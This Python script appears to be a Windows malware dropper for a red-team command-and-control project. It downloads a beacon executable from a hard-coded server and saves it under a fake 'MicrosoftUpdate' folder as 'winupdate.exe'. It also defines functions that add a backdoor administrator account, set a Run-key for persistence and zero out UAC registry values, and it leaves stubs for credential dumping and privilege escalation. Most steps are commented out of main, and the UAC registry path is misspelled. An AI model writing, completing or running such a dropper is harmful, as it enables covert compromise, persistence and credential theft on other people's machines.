import os
import sys
import win32api
import win32con
import winreg
import subprocess
import requests

### Two Methods to run the beacon
### 1. Ship Dockerfile and that's the hard way to install WSL without UAC and then install docker and run the Dockerfile
### 2. Ship the beacon itself and run in it that's the easy way but test it also 
###  We need the user or the hostname pasword while in use


SERVER_URL   = "http://192.168.1.69:6655/files"
AGENT_EXE    = "windows_beacon.exe"
INSTALL_DIR  = os.path.join(os.getenv("APPDATA"), "MicrosoftUpdate")
AGENT_PATH   = os.path.join(INSTALL_DIR, "winupdate.exe")

def download_file(filename, dest_path):
    # Option 1: Download Dockerfile or Docker Compose which has the beacon
    # Option 2: Download the beacon.exe itself without dokcer which is easier to detect

    url = f"{SERVER_URL}/{filename}"
    try:
        r = requests.get(url, timeout=15)
        if r.status_code == 200:
            with open(dest_path, "wb") as f:
                f.write(r.content)
            print(f"[+] Downloaded {filename} -> {dest_path}")
            return True
        else:
            print(f"[!] Failed to fetch {filename}: HTTP {r.status_code}")
            return False
    except Exception as e:
        print(f"Error downloading file: {e}")
        return False

def gain_admin_or_system():
    pass

def steal_credentials():
    # Get the admin user and the passowrd using the below techniques
    # https://attack.mitre.org/techniques/T1003
    pass

def create_admin_user_windows(username, password):
    # Use the stolen credentials to create my user

    try:
        subprocess.run(["net", "user", username, password, "/add"], check=True, text=True)
        subprocess.run(["net", "localgroup", "Administrators", username, "/add"], check=True, text=True)
        print("User Added to Admin")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred: {e}")
        print("Make sure to run the script as an administrator.")
    except FileNotFoundError:
        print("The 'net' command was not found. This script is for Windows.")

def add_run_key(agent_path):
    # Use Admin to create it

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    except FileNotFoundError:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")

    winreg.SetValueEx(key, "Beacon", 0, winreg.REG_SZ, agent_path)
    winreg.CloseKey(key)
    print(f"Added '{agent_path}' to startup.")
    
def set_uac_registry_values_to_zero():
    # Use Admin to create it

    key_path = r"SOFTFWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    values_to_set = [
        "EnableLUA",
        "ConsentPromptBehaviorAdmin",
        "ConsentPromptBehaviorUser",
        "PromptOnSecureDesktop"
    ]
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
        for value_name in values_to_set:
            try:
                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 0)
                print(f"Successfully set '{value_name}' to 0.")
            except Exception as e:
                print(f"Error setting '{value_name}': {e}")
    except Exception as e:
        print(f"Error opening registry key: {e}")
    finally:
        if 'key' in locals():
            winreg.CloseKey(key)

def run_beacon():
    # Run the Dockerfile or docker compose that will have the beacon
    #

    print("Launching executable...")
    try:
        subprocess.run([AGENT_PATH], check=False) 
        print("Executable launched.")
    except FileNotFoundError:
        print(f"Executable not found at: {AGENT_PATH}")
    

def main():
    os.makedirs(INSTALL_DIR, exist_ok=True)
    
    if not os.path.exists(AGENT_PATH):
        success = download_file(AGENT_EXE, AGENT_PATH)
        if not success:
            sys.exit(1)
    else:
        print("[*] Agent already exists, skipping download")
        
    # steal_credentials()
    # create_admin_user_windows("redc2","omar")
    # add_run_key() # or lunch a service
    # set_uac_registry_values_to_zero() #bypass UAC
    # run_beacon()

if __name__ == "__main__":
    main()
